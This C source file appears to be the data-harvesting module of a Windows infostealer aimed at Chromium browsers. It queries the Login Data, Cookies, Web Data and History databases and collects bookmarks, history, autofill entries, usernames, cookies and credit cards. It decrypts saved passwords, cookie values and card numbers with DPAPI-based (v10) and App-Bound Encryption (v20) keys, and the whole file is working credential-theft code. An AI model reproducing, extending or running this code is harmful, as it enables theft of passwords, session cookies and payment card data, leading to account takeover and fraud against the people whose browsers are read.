#include "Headers.h"
#include "sqlite3.h"

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

static BOOL ExpandArray(IN OUT PVOID* ppArray, IN DWORD dwItemSize, IN OUT PDWORD pdwCapacity)
{
    PVOID   pNewArray       = NULL;

#define GROWTH_FACTOR 2
    DWORD   dwNewCapacity   = (*pdwCapacity) * GROWTH_FACTOR;
#undef GROWTH_FACTOR

    if (!(pNewArray = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwNewCapacity * dwItemSize)))
    {
        DBGA("[!] HeapAlloc Failed With Error: %lu\n", GetLastError());
        return FALSE;
    }

    RtlCopyMemory(pNewArray, *ppArray, (*pdwCapacity) * dwItemSize);

    HEAP_FREE(*ppArray);

    *ppArray        = pNewArray;
    *pdwCapacity    = dwNewCapacity;

    return TRUE;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

#pragma region ADD_ENTRY_FUNCTIONS

BOOL AddTokenEntry(IN OUT PCHROMIUM_DATA pChromiumData, IN LPCSTR pszService, IN PBYTE pbToken, IN DWORD dwTokenLen, IN PBYTE pbBindKey, IN DWORD dwBindKeyLen)
{
    PTOKEN_ENTRY pEntry = NULL;

    if (!pChromiumData || !pbToken || dwTokenLen == 0)
        return FALSE;

    if (pChromiumData->dwTokenCount >= pChromiumData->dwTokenCapacity)
    {
        if (!ExpandArray((PVOID*)&pChromiumData->pTokens, sizeof(TOKEN_ENTRY), &pChromiumData->dwTokenCapacity))
            return FALSE;
    }

    pEntry = &pChromiumData->pTokens[pChromiumData->dwTokenCount];

    pEntry->pszService  = pszService ? DuplicateAnsiString(pszService) : NULL;
    pEntry->pbToken     = DuplicateBuffer(pbToken, dwTokenLen);
    pEntry->dwTokenLen  = dwTokenLen;

    if (pbBindKey && dwBindKeyLen > 0)
    {
        pEntry->pbBindKey       = DuplicateBuffer(pbBindKey, dwBindKeyLen);
        pEntry->dwBindKeyLen    = dwBindKeyLen;
    }
    else
    {
        pEntry->pbBindKey       = NULL;
        pEntry->dwBindKeyLen    = 0;
    }

    if (!pEntry->pbToken)
        return FALSE;

    pChromiumData->dwTokenCount++;
    return TRUE;
}

BOOL AddCookieEntry(IN OUT PCHROMIUM_DATA pChromiumData, IN LPCSTR pszHostKey, IN LPCSTR pszPath, IN LPCSTR pszName, IN INT64 llExpiresUtc, IN PBYTE pbValue, IN DWORD dwValueLen)
{
    PCOOKIE_ENTRY pEntry = NULL;

    if (!pChromiumData)
        return FALSE;

    if (pChromiumData->dwCookieCount >= pChromiumData->dwCookieCapacity)
    {
        if (!ExpandArray((PVOID*)&pChromiumData->pCookies, sizeof(COOKIE_ENTRY), &pChromiumData->dwCookieCapacity))
            return FALSE;
    }

    pEntry = &pChromiumData->pCookies[pChromiumData->dwCookieCount];

    pEntry->pszHostKey      = pszHostKey ? DuplicateAnsiString(pszHostKey) : NULL;
    pEntry->pszPath         = pszPath ? DuplicateAnsiString(pszPath) : NULL;
    pEntry->pszName         = pszName ? DuplicateAnsiString(pszName) : NULL;
    pEntry->llExpiresUtc    = llExpiresUtc;
    pEntry->pbValue         = (pbValue && dwValueLen > 0) ? DuplicateBuffer(pbValue, dwValueLen) : NULL;
    pEntry->dwValueLen      = dwValueLen;

    pChromiumData->dwCookieCount++;
    return TRUE;
}

BOOL AddLoginEntry(IN OUT PCHROMIUM_DATA pChromiumData, IN LPCSTR pszOriginUrl, IN LPCSTR pszActionUrl, IN LPCSTR pszUsername, IN PBYTE pbPassword, IN DWORD dwPasswordLen, IN INT64 llDateCreated, IN INT64 llDateLastUsed)
{
    PLOGIN_ENTRY pEntry = NULL;

    if (!pChromiumData)
        return FALSE;

    if (pChromiumData->dwLoginCount >= pChromiumData->dwLoginCapacity)
    {
        if (!ExpandArray((PVOID*)&pChromiumData->pLogins, sizeof(LOGIN_ENTRY), &pChromiumData->dwLoginCapacity))
            return FALSE;
    }

    pEntry = &pChromiumData->pLogins[pChromiumData->dwLoginCount];

    pEntry->pszOriginUrl    = pszOriginUrl ? DuplicateAnsiString(pszOriginUrl) : NULL;
    pEntry->pszActionUrl    = pszActionUrl ? DuplicateAnsiString(pszActionUrl) : NULL;
    pEntry->pszUsername     = pszUsername ? DuplicateAnsiString(pszUsername) : NULL;
    pEntry->pbPassword      = (pbPassword && dwPasswordLen > 0) ? DuplicateBuffer(pbPassword, dwPasswordLen) : NULL;
    pEntry->dwPasswordLen   = dwPasswordLen;
    pEntry->llDateCreated   = llDateCreated;
    pEntry->llDateLastUsed  = llDateLastUsed;

    pChromiumData->dwLoginCount++;
    return TRUE;
}

BOOL AddCreditCardEntry(IN OUT PCHROMIUM_DATA pChromiumData, IN LPCSTR pszNameOnCard, IN LPCSTR pszNickname, IN DWORD dwExpirationMonth, IN DWORD dwExpirationYear, IN INT64 llDateModified, IN PBYTE pbCardNumber, IN DWORD dwCardNumberLen)
{
    PCREDIT_CARD_ENTRY pEntry = NULL;

    if (!pChromiumData)
        return FALSE;

    if (pChromiumData->dwCreditCardCount >= pChromiumData->dwCreditCardCapacity)
    {
        if (!ExpandArray((PVOID*)&pChromiumData->pCreditCards, sizeof(CREDIT_CARD_ENTRY), &pChromiumData->dwCreditCardCapacity))
            return FALSE;
    }

    pEntry = &pChromiumData->pCreditCards[pChromiumData->dwCreditCardCount];

    pEntry->pszNameOnCard       = pszNameOnCard ? DuplicateAnsiString(pszNameOnCard) : NULL;
    pEntry->pszNickname         = pszNickname ? DuplicateAnsiString(pszNickname) : NULL;
    pEntry->dwExpirationMonth   = dwExpirationMonth;
    pEntry->dwExpirationYear    = dwExpirationYear;
    pEntry->llDateModified      = llDateModified;
    pEntry->pbCardNumber        = (pbCardNumber && dwCardNumberLen > 0) ? DuplicateBuffer(pbCardNumber, dwCardNumberLen) : NULL;
    pEntry->dwCardNumberLen     = dwCardNumberLen;

    pChromiumData->dwCreditCardCount++;
    return TRUE;
}

BOOL AddAutofillEntry(IN OUT PCHROMIUM_DATA pChromiumData, IN LPCSTR pszName, IN LPCSTR pszValue, IN INT64 llDateCreated, IN DWORD dwCount)
{
    PAUTOFILL_ENTRY pEntry = NULL;

    if (!pChromiumData)
        return FALSE;

    if (pChromiumData->dwAutofillCount >= pChromiumData->dwAutofillCapacity)
    {
        if (!ExpandArray((PVOID*)&pChromiumData->pAutofill, sizeof(AUTOFILL_ENTRY), &pChromiumData->dwAutofillCapacity))
            return FALSE;
    }

    pEntry = &pChromiumData->pAutofill[pChromiumData->dwAutofillCount];

    pEntry->pszName         = pszName ? DuplicateAnsiString(pszName) : NULL;
    pEntry->pszValue        = pszValue ? DuplicateAnsiString(pszValue) : NULL;
    pEntry->llDateCreated   = llDateCreated;
    pEntry->dwCount         = dwCount;

    pChromiumData->dwAutofillCount++;
    return TRUE;
}

BOOL AddHistoryEntry(IN OUT PCHROMIUM_DATA pChromiumData, IN LPCSTR pszUrl, IN LPCSTR pszTitle, IN DWORD dwVisitCount, IN INT64 llLastVisitTime)
{
    PHISTORY_ENTRY pEntry = NULL;

    if (!pChromiumData)
        return FALSE;

    if (pChromiumData->dwHistoryCount >= pChromiumData->dwHistoryCapacity)
    {
        if (!ExpandArray((PVOID*)&pChromiumData->pHistory, sizeof(HISTORY_ENTRY), &pChromiumData->dwHistoryCapacity))
            return FALSE;
    }

    pEntry = &pChromiumData->pHistory[pChromiumData->dwHistoryCount];

    pEntry->pszUrl          = pszUrl ? DuplicateAnsiString(pszUrl) : NULL;
    pEntry->pszTitle        = pszTitle ? DuplicateAnsiString(pszTitle) : NULL;
    pEntry->dwVisitCount    = dwVisitCount;
    pEntry->llLastVisitTime = llLastVisitTime;

    pChromiumData->dwHistoryCount++;
    return TRUE;
}

BOOL AddBookmarkEntry(IN OUT PCHROMIUM_DATA pChromiumData, IN LPCSTR pszName, IN LPCSTR pszUrl, IN INT64 llDateAdded)
{
    PBOOKMARK_ENTRY pEntry = NULL;

    if (!pChromiumData)
        return FALSE;

    if (pChromiumData->dwBookmarkCount >= pChromiumData->dwBookmarkCapacity)
    {
        if (!ExpandArray((PVOID*)&pChromiumData->pBookmarks, sizeof(BOOKMARK_ENTRY), &pChromiumData->dwBookmarkCapacity))
            return FALSE;
    }

    pEntry = &pChromiumData->pBookmarks[pChromiumData->dwBookmarkCount];

    pEntry->pszName     = pszName ? DuplicateAnsiString(pszName) : NULL;
    pEntry->pszUrl      = pszUrl ? DuplicateAnsiString(pszUrl) : NULL;
    pEntry->llDateAdded = llDateAdded;

    pChromiumData->dwBookmarkCount++;
    return TRUE;
}

#pragma endregion

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

#pragma region EXTRACT_DATA_FUNCTIONS

static VOID ParseBookmarkNode(IN LPCSTR pszJson, IN DWORD cbJson, IN OUT PCHROMIUM_DATA pChromiumData)
{
    LPCSTR  pszCursor   = pszJson;
    LPCSTR  pszJsonEnd  = pszJson + cbJson;
    DWORD   dwCount     = 0x00;

    while (pszCursor && pszCursor < pszJsonEnd)
    {
        LPCSTR  pszTypeKey      = NULL,
                pszTypeValue    = NULL,
                pszTypeEnd      = NULL;
        DWORD   dwType          = 0x00;

        if (!(pszTypeKey = StrStrA(pszCursor, JSON_KEY_TYPE)) || pszTypeKey >= pszJsonEnd)
            break;

        if (!(pszTypeValue = StrChrA(pszTypeKey + JSON_KEY_TYPE_LEN, '"')) || pszTypeValue >= pszJsonEnd)
            break;
        
        pszTypeValue++;

        if (!(pszTypeEnd = StrChrA(pszTypeValue, '"')) || pszTypeEnd >= pszJsonEnd)
            break;

        dwType = (DWORD)(pszTypeEnd - pszTypeValue);

        if (dwType == JSON_VALUE_URL_LEN && StrCmpNIA(pszTypeValue, JSON_VALUE_URL, JSON_VALUE_URL_LEN) == 0)
        {
#define JSON_SEARCH_BACK_LEN 500
            LPCSTR pszSearchStart   = (pszTypeKey > pszJson + JSON_SEARCH_BACK_LEN) ? (pszTypeKey - JSON_SEARCH_BACK_LEN) : pszJson;
#undef JSON_SEARCH_BACK_LEN
            LPCSTR pszNameKey       = NULL;
            LPCSTR pszTemp          = pszSearchStart;
            
            while ((pszTemp = StrStrA(pszTemp, JSON_KEY_NAME)) != NULL && pszTemp < pszTypeKey)
            {
                pszNameKey = pszTemp;
                pszTemp++;
            }

            if (pszNameKey)
            {
                LPCSTR  pszNameValue    = NULL,
                        pszNameEnd      = NULL,
                        pszUrlKey       = NULL,
                        pszUrlValue     = NULL,
                        pszUrlEnd       = NULL;
                DWORD   dwName          = 0x00;

                if ((pszNameValue = StrChrA(pszNameKey + JSON_KEY_NAME_LEN, '"')) && pszNameValue < pszTypeKey)
                {
                    pszNameValue++;
                    
                    if ((pszNameEnd = StrChrA(pszNameValue, '"')) && pszNameEnd < pszTypeKey)
                    {
                        dwName = (DWORD)(pszNameEnd - pszNameValue);

                        if ((pszUrlKey = StrStrA(pszTypeEnd, JSON_KEY_URL)) && pszUrlKey < pszJsonEnd)
                        {
                            if ((pszUrlValue = StrChrA(pszUrlKey + JSON_KEY_URL_LEN, '"')) && pszUrlValue < pszJsonEnd)
                            {
                                pszUrlValue++;
                                
                                if ((pszUrlEnd = StrChrA(pszUrlValue, '"')) && pszUrlEnd < pszJsonEnd)
                                {
                                    DWORD   dwUrl       = (DWORD)(pszUrlEnd - pszUrlValue);
                                    CHAR    cNameSave   = pszNameValue[dwName];
                                    CHAR    cUrlSave    = pszUrlValue[dwUrl];

                                    ((LPSTR)pszNameValue)[dwName]   = '\0';
                                    ((LPSTR)pszUrlValue)[dwUrl]     = '\0';

                                    AddBookmarkEntry(pChromiumData, pszNameValue, pszUrlValue, 0);
                                    dwCount++;

                                    ((LPSTR)pszNameValue)[dwName] = cNameSave;
                                    ((LPSTR)pszUrlValue)[dwUrl] = cUrlSave;
                                }
                            }
                        }
                    }
                }
            }
        }

        pszCursor = pszTypeEnd + 1;
    }
}

BOOL ExtractBookmarksFromFile(IN BROWSER_TYPE Browser, IN OUT PCHROMIUM_DATA pChromiumData)
{
    LPSTR   pszBookmarksPath    = NULL;
    LPSTR   pszFileContent      = NULL;
    CHAR    szRelPath[MAX_PATH] = { 0 };
    DWORD   dwFileSize          = 0;
    BOOL    bResult             = FALSE;

    if (!GetChromiumBrowserFilePath(Browser, FILE_TYPE_BOOKMARKS, szRelPath, MAX_PATH))
        return FALSE;

    if (!(pszBookmarksPath = GetBrowserDataFilePath(Browser, szRelPath)))
        return FALSE;

    if (!ReadFileFromDiskA(pszBookmarksPath, (PBYTE*)&pszFileContent, &dwFileSize))
        goto _END_OF_FUNC;

    ParseBookmarkNode(pszFileContent, dwFileSize, pChromiumData);

    bResult = TRUE;

_END_OF_FUNC:
    HEAP_FREE(pszBookmarksPath);
    HEAP_FREE(pszFileContent);
    return bResult;
}

BOOL ExtractHistoryFromDatabase(IN BROWSER_TYPE Browser, IN OUT PCHROMIUM_DATA pChromiumData)
{
    sqlite3*        pDb                     = NULL;
    sqlite3_stmt*   pStmt                   = NULL;
    INT             nSqliteResult           = SQLITE_OK;
    LPCSTR          szUrl                   = NULL;
    LPCSTR          szTitle                 = NULL;
    LPCSTR          pszHistoryDatabasePath  = NULL;
    CHAR            szRelPath[MAX_PATH]     = { 0 };
    DWORD           dwVisitCount            = 0;
    INT64           llLastVisitTime         = 0;
    BOOL            bResult                 = FALSE;

    if (!GetChromiumBrowserFilePath(Browser, FILE_TYPE_HISTORY, szRelPath, MAX_PATH))
        return FALSE;

    if (!(pszHistoryDatabasePath = GetBrowserDataFilePath(Browser, szRelPath)))
        return FALSE;

    if ((nSqliteResult = sqlite3_open_v2(pszHistoryDatabasePath, &pDb, SQLITE_OPEN_READONLY, NULL)) != SQLITE_OK)
    {
        DBGA("[!] sqlite3_open_v2 Failed With Error: %d (%s)", nSqliteResult, sqlite3_errmsg(pDb));
        goto _END_OF_FUNC;
    }

    if ((nSqliteResult = sqlite3_prepare_v2(pDb, SQLQUERY_HISTORY, -1, &pStmt, NULL)) != SQLITE_OK)
    {
        DBGA("[!] sqlite3_prepare_v2 Failed With Error: %d (%s)", nSqliteResult, sqlite3_errmsg(pDb));
        goto _END_OF_FUNC;
    }

    DBGV("[+] Executing Query: %s", SQLQUERY_HISTORY);

    while ((nSqliteResult = sqlite3_step(pStmt)) == SQLITE_ROW)
    {
        szUrl           = (LPCSTR)sqlite3_column_text(pStmt, 0);
        szTitle         = (LPCSTR)sqlite3_column_text(pStmt, 1);
        dwVisitCount    = sqlite3_column_int(pStmt, 2);
        llLastVisitTime = sqlite3_column_int64(pStmt, 3);

        AddHistoryEntry(pChromiumData, szUrl, szTitle, dwVisitCount, llLastVisitTime);
    }

    if (nSqliteResult != SQLITE_DONE)
    {
        DBGA("[!] sqlite3_step Failed With Error: %d (%s)", nSqliteResult, sqlite3_errmsg(pDb));
        goto _END_OF_FUNC;
    }

    bResult = TRUE;

_END_OF_FUNC:
    if (pStmt)
        sqlite3_finalize(pStmt);
    if (pDb)
        sqlite3_close(pDb);
    HEAP_FREE(pszHistoryDatabasePath);
    return bResult;
}

BOOL ExtractAutofillFromDatabase(IN BROWSER_TYPE Browser, IN OUT PCHROMIUM_DATA pChromiumData)
{
    sqlite3*        pDb                     = NULL;
    sqlite3_stmt*   pStmt                   = NULL;
    INT             nSqliteResult           = SQLITE_OK;
    LPCSTR          szName                  = NULL;
    LPCSTR          szValue                 = NULL;
    LPCSTR          pszWebDatabasePath      = NULL;
    CHAR            szRelPath[MAX_PATH]     = { 0 };
    INT64           llDateCreated           = 0;
    DWORD           dwCount                 = 0;
    BOOL            bResult                 = FALSE;

    if (!GetChromiumBrowserFilePath(Browser, FILE_TYPE_WEB_DATA, szRelPath, MAX_PATH))
        return FALSE;

    if (!(pszWebDatabasePath = GetBrowserDataFilePath(Browser, szRelPath)))
        return FALSE;

    if ((nSqliteResult = sqlite3_open_v2(pszWebDatabasePath, &pDb, SQLITE_OPEN_READONLY, NULL)) != SQLITE_OK)
    {
        DBGA("[!] sqlite3_open_v2 Failed With Error: %d (%s)", nSqliteResult, sqlite3_errmsg(pDb));
        goto _END_OF_FUNC;
    }

    if ((nSqliteResult = sqlite3_prepare_v2(pDb, SQLQUERY_AUTOFILL, -1, &pStmt, NULL)) != SQLITE_OK)
    {
        DBGA("[!] sqlite3_prepare_v2 Failed With Error: %d (%s)", nSqliteResult, sqlite3_errmsg(pDb));
        goto _END_OF_FUNC;
    }

    DBGV("[+] Executing Query: %s", SQLQUERY_AUTOFILL);

    while ((nSqliteResult = sqlite3_step(pStmt)) == SQLITE_ROW)
    {
        szName          = (LPCSTR)sqlite3_column_text(pStmt, 0);
        szValue         = (LPCSTR)sqlite3_column_text(pStmt, 1);
        llDateCreated   = sqlite3_column_int64(pStmt, 2);
        dwCount         = sqlite3_column_int(pStmt, 3);

        AddAutofillEntry(pChromiumData, szName, szValue, llDateCreated, dwCount);
    }

    if (nSqliteResult != SQLITE_DONE)
    {
        DBGA("[!] sqlite3_step Failed With Error: %d (%s)", nSqliteResult, sqlite3_errmsg(pDb));
        goto _END_OF_FUNC;
    }

    bResult = TRUE;

_END_OF_FUNC:
    if (pStmt)
        sqlite3_finalize(pStmt);
    if (pDb)
        sqlite3_close(pDb);
    HEAP_FREE(pszWebDatabasePath);
    return bResult;
}

BOOL ExtractCreditCardsFromDatabase(IN BROWSER_TYPE Browser, IN OUT PCHROMIUM_DATA pChromiumData)
{
    sqlite3*        pDb                         = NULL;
    sqlite3_stmt*   pStmt                       = NULL;
    INT             nSqliteResult               = SQLITE_OK;
    LPCSTR          szNameOnCard                = NULL;
    LPCSTR          szNickname                  = NULL;
    LPCSTR          pszWebDatabasePath          = NULL;
    CHAR            szRelPath[MAX_PATH]         = { 0 };
    DWORD           dwExpirationMonth           = 0;
    DWORD           dwExpirationYear            = 0;
    INT64           llDateModified              = 0;
    PBYTE           pbEncryptedCardNumber       = NULL;
    DWORD           dwEncryptedCardNumberSize   = 0;
    PBYTE           pbDecryptedCardNumber       = NULL;
    DWORD           dwDecryptedCardNumberSize   = 0;
    BOOL            bResult                     = FALSE;

    if (!GetChromiumBrowserFilePath(Browser, FILE_TYPE_WEB_DATA, szRelPath, MAX_PATH))
        return FALSE;

    if (!(pszWebDatabasePath = GetBrowserDataFilePath(Browser, szRelPath)))
        return FALSE;

    if ((nSqliteResult = sqlite3_open_v2(pszWebDatabasePath, &pDb, SQLITE_OPEN_READONLY, NULL)) != SQLITE_OK)
    {
        DBGA("[!] sqlite3_open_v2 Failed With Error: %d (%s)", nSqliteResult, sqlite3_errmsg(pDb));
        goto _END_OF_FUNC;
    }

    if ((nSqliteResult = sqlite3_prepare_v2(pDb, SQLQUERY_CREDIT_CARDS, -1, &pStmt, NULL)) != SQLITE_OK)
    {
        DBGA("[!] sqlite3_prepare_v2 Failed With Error: %d (%s)", nSqliteResult, sqlite3_errmsg(pDb));
        goto _END_OF_FUNC;
    }

    DBGV("[+] Executing Query: %s", SQLQUERY_CREDIT_CARDS);

    while ((nSqliteResult = sqlite3_step(pStmt)) == SQLITE_ROW)
    {
        szNameOnCard                = (LPCSTR)sqlite3_column_text(pStmt, 0);
        dwExpirationMonth           = sqlite3_column_int(pStmt, 1);
        dwExpirationYear            = sqlite3_column_int(pStmt, 2);
        pbEncryptedCardNumber       = (PBYTE)sqlite3_column_blob(pStmt, 3);
        dwEncryptedCardNumberSize   = sqlite3_column_bytes(pStmt, 3);
        szNickname                  = (LPCSTR)sqlite3_column_text(pStmt, 4);
        llDateModified              = sqlite3_column_int64(pStmt, 5);

        pbDecryptedCardNumber       = NULL;
        dwDecryptedCardNumberSize   = 0;

        if (pbEncryptedCardNumber && dwEncryptedCardNumberSize)
        {
            // Try v20 (App-Bound Encryption) 
            if (HAS_V20_PREFIX(pbEncryptedCardNumber, dwEncryptedCardNumberSize))
            {
                if (!DecryptChromiumV20Secret(pChromiumData->pbAppBoundKey, pChromiumData->dwAppBoundKeyLen, pbEncryptedCardNumber, dwEncryptedCardNumberSize, &pbDecryptedCardNumber, &dwDecryptedCardNumberSize))
                    DBGA("[!] DecryptChromiumV20Secret Failed For Credit Card Of: %s", szNameOnCard);
            }
            // Try v10 
            else if (HAS_V10_PREFIX(pbEncryptedCardNumber, dwEncryptedCardNumberSize))
            {
                if (!DecryptChromiumV10Secret(pChromiumData->pbDpapiKey, pChromiumData->dwDpapiKeyLen, pbEncryptedCardNumber, dwEncryptedCardNumberSize, &pbDecryptedCardNumber, &dwDecryptedCardNumberSize))
                    DBGA("[!] DecryptChromiumV10Secret Failed For Credit Card Of: %s", szNameOnCard);
            }
            
            // Save it
            if (pbDecryptedCardNumber && dwDecryptedCardNumberSize)
            {
                AddCreditCardEntry(pChromiumData, szNameOnCard, szNickname, dwExpirationMonth, dwExpirationYear, llDateModified, pbDecryptedCardNumber, dwDecryptedCardNumberSize);
                HEAP_FREE(pbDecryptedCardNumber);
            }
        }
    }

    if (nSqliteResult != SQLITE_DONE)
    {
        DBGA("[!] sqlite3_step Failed With Error: %d (%s)", nSqliteResult, sqlite3_errmsg(pDb));
        goto _END_OF_FUNC;
    }

    bResult = TRUE;

_END_OF_FUNC:
    if (pStmt)
        sqlite3_finalize(pStmt);
    if (pDb)
        sqlite3_close(pDb);
    HEAP_FREE(pszWebDatabasePath);
    return bResult;
}

BOOL ExtractLoginsFromDatabase(IN BROWSER_TYPE Browser, IN OUT PCHROMIUM_DATA pChromiumData)
{
    sqlite3*        pDb                         = NULL;
    sqlite3_stmt*   pStmt                       = NULL;
    INT             nSqliteResult               = SQLITE_OK;
    LPCSTR          szOriginUrl                 = NULL;
    LPCSTR          szActionUrl                 = NULL;
    LPCSTR          szUsername                  = NULL;
    LPCSTR          pszLoginDatabasePath        = NULL;
    CHAR            szRelPath[MAX_PATH]         = { 0 };
    PBYTE           pbEncryptedPassword         = NULL;
    DWORD           dwEncryptedPasswordSize     = 0;
    PBYTE           pbDecryptedPassword         = NULL;
    DWORD           dwDecryptedPasswordSize     = 0;
    INT64           llDateCreated               = 0;
    INT64           llDateLastUsed              = 0;
    BOOL            bResult                     = FALSE;

    if (!GetChromiumBrowserFilePath(Browser, FILE_TYPE_LOGIN_DATA, szRelPath, MAX_PATH))
        return FALSE;

    if (!(pszLoginDatabasePath = GetBrowserDataFilePath(Browser, szRelPath)))
        return FALSE;

    if ((nSqliteResult = sqlite3_open_v2(pszLoginDatabasePath, &pDb, SQLITE_OPEN_READONLY, NULL)) != SQLITE_OK)
    {
        DBGA("[!] sqlite3_open_v2 Failed With Error: %d (%s)", nSqliteResult, sqlite3_errmsg(pDb));
        goto _END_OF_FUNC;
    }

    if ((nSqliteResult = sqlite3_prepare_v2(pDb, SQLQUERY_LOGINS, -1, &pStmt, NULL)) != SQLITE_OK)
    {
        DBGA("[!] sqlite3_prepare_v2 Failed With Error: %d (%s)", nSqliteResult, sqlite3_errmsg(pDb));
        goto _END_OF_FUNC;
    }

    DBGV("[v] Executing Query: %s", SQLQUERY_LOGINS);

    while ((nSqliteResult = sqlite3_step(pStmt)) == SQLITE_ROW)
    {
        szOriginUrl             = (LPCSTR)sqlite3_column_text(pStmt, 0);
        szActionUrl             = (LPCSTR)sqlite3_column_text(pStmt, 1);
        szUsername              = (LPCSTR)sqlite3_column_text(pStmt, 2);
        pbEncryptedPassword     = (PBYTE)sqlite3_column_blob(pStmt, 3);
        dwEncryptedPasswordSize = sqlite3_column_bytes(pStmt, 3);
        llDateCreated           = sqlite3_column_int64(pStmt, 4);
        llDateLastUsed          = sqlite3_column_int64(pStmt, 5);
        pbDecryptedPassword     = NULL;
        dwDecryptedPasswordSize = 0x00;

        if (pbEncryptedPassword && dwEncryptedPasswordSize)
        {
            // Try v20 (App-Bound Encryption) 
            if (HAS_V20_PREFIX(pbEncryptedPassword, dwEncryptedPasswordSize))
            {
                if (!DecryptChromiumV20Secret(pChromiumData->pbAppBoundKey, pChromiumData->dwAppBoundKeyLen, pbEncryptedPassword, dwEncryptedPasswordSize, &pbDecryptedPassword, &dwDecryptedPasswordSize))
                    DBGA("[!] DecryptChromiumV20Secret Failed For Login: %s", szOriginUrl);
            }
            // Try v10 
            if (HAS_V10_PREFIX(pbEncryptedPassword, dwEncryptedPasswordSize))
            {
                if (!DecryptChromiumV10Secret(pChromiumData->pbDpapiKey, pChromiumData->dwDpapiKeyLen, pbEncryptedPassword, dwEncryptedPasswordSize, &pbDecryptedPassword, &dwDecryptedPasswordSize))
                    DBGA("[!] DecryptChromiumV10Secret Failed For Login: %s", szOriginUrl);
            }

            // Save it
            if (pbDecryptedPassword && dwDecryptedPasswordSize)
            {
                AddLoginEntry(pChromiumData, szOriginUrl, szActionUrl, szUsername, pbDecryptedPassword, dwDecryptedPasswordSize, llDateCreated, llDateLastUsed);
                HEAP_FREE_SECURE(pbDecryptedPassword, dwDecryptedPasswordSize);
            }
        }
    }
    if (nSqliteResult != SQLITE_DONE)
    {
        DBGA("[!] sqlite3_step Failed With Error: %d (%s)", nSqliteResult, sqlite3_errmsg(pDb));
        goto _END_OF_FUNC;
    }

    bResult = TRUE;

_END_OF_FUNC:
    if (pStmt)
        sqlite3_finalize(pStmt);
    if (pDb)
        sqlite3_close(pDb);
    HEAP_FREE(pszLoginDatabasePath);
    return bResult;
}

BOOL ExtractCookiesFromDatabase(IN BROWSER_TYPE Browser, IN OUT PCHROMIUM_DATA pChromiumData)
{
    sqlite3*        pDb                     = NULL;
    sqlite3_stmt*   pStmt                   = NULL;
    INT             nSqliteResult           = SQLITE_OK;
    LPCSTR          szHostKey               = NULL;
    LPCSTR          szPath                  = NULL;
    LPCSTR          szName                  = NULL;
    LPCSTR          pszCookiesDatabasePath  = NULL;
    CHAR            szRelPath[MAX_PATH]     = { 0 };
    INT64           llExpiresUtc            = 0x00;
    PBYTE           pbEncryptedValue        = NULL;
    DWORD           dwEncryptedValueSize    = 0x00;
    PBYTE           pbDecryptedValue        = NULL;
    DWORD           dwDecryptedValueSize    = 0x00;
    BOOL            bResult                 = FALSE;

    if (!GetChromiumBrowserFilePath(Browser, FILE_TYPE_COOKIES, szRelPath, MAX_PATH))
        return FALSE;

    if (!(pszCookiesDatabasePath = GetBrowserDataFilePath(Browser, szRelPath)))
        return FALSE;

    if ((nSqliteResult = sqlite3_open_v2(pszCookiesDatabasePath, &pDb, SQLITE_OPEN_READONLY, NULL)) != SQLITE_OK)
    {
        DBGA("[!] sqlite3_open_v2 Failed With Error: %d (%s)", nSqliteResult, sqlite3_errmsg(pDb));
        goto _END_OF_FUNC;
    }

    if ((nSqliteResult = sqlite3_prepare_v2(pDb, SQLQUERY_COOKIES, -1, &pStmt, NULL)) != SQLITE_OK)
    {
        DBGA("[!] sqlite3_prepare_v2 Failed With Error: %d (%s)", nSqliteResult, sqlite3_errmsg(pDb));
        goto _END_OF_FUNC;
    }

    DBGV("[+] Executing Query: %s", SQLQUERY_COOKIES);

    while ((nSqliteResult = sqlite3_step(pStmt)) == SQLITE_ROW)
    {
        szHostKey               = (LPCSTR)sqlite3_column_text(pStmt, 0);
        szPath                  = (LPCSTR)sqlite3_column_text(pStmt, 1);
        szName                  = (LPCSTR)sqlite3_column_text(pStmt, 2);
        llExpiresUtc            = sqlite3_column_int64(pStmt, 3);
        pbEncryptedValue        = (PBYTE)sqlite3_column_blob(pStmt, 4);
        dwEncryptedValueSize    = sqlite3_column_bytes(pStmt, 4);

        pbDecryptedValue        = NULL;
        dwDecryptedValueSize    = 0;

        if (pbEncryptedValue && dwEncryptedValueSize)
        {
            // Try v20 (App-Bound Encryption) 
            if (HAS_V20_PREFIX(pbEncryptedValue, dwEncryptedValueSize))
            {
                if (DecryptChromiumV20Secret(pChromiumData->pbAppBoundKey, pChromiumData->dwAppBoundKeyLen, pbEncryptedValue, dwEncryptedValueSize, &pbDecryptedValue, &dwDecryptedValueSize))
                {
                    // The value of the cookie starts after the first 32 bytes (Thanks to luci4_vx::https://luci4.net) 
                    if (dwDecryptedValueSize > BUFFER_SIZE_32)
                        AddCookieEntry(pChromiumData, szHostKey, szPath, szName, llExpiresUtc, pbDecryptedValue + BUFFER_SIZE_32, dwDecryptedValueSize - BUFFER_SIZE_32);
                    else
                        AddCookieEntry(pChromiumData, szHostKey, szPath, szName, llExpiresUtc, pbDecryptedValue, dwDecryptedValueSize);

                    HEAP_FREE(pbDecryptedValue);
                }
                else
                {
                    DBGA("[!] DecryptChromiumV20Secret Failed For Cookie: %s", szName);
                }
            }
            // Try V10 
            if (HAS_V10_PREFIX(pbEncryptedValue, dwEncryptedValueSize))
            {
                if (DecryptChromiumV10Secret(pChromiumData->pbDpapiKey, pChromiumData->dwDpapiKeyLen, pbEncryptedValue, dwEncryptedValueSize, &pbDecryptedValue, &dwDecryptedValueSize))
                {
                    AddCookieEntry(pChromiumData, szHostKey, szPath, szName, llExpiresUtc, pbDecryptedValue, dwDecryptedValueSize);
                    HEAP_FREE(pbDecryptedValue);
                }
                else
                {
                    DBGA("[!] DecryptChromiumV10Secret Failed For Cookie: %s", szName);
                }
            }
        }
    }

    if (nSqliteResult != SQLITE_DONE)
    {
        DBGA("[!] sqlite3_step Failed With Error: %d (%s)", nSqliteResult, sqlite3_errmsg(pDb));
        goto _END_OF_FUNC;
    }

    bResult = TRUE;

_END_OF_FUNC:
    if (pStmt)
        sqlite3_finalize(pStmt);
    if (pDb)
        sqlite3_close(pDb);
    HEAP_FREE(pszCookiesDatabasePath);
    return bResult;
}

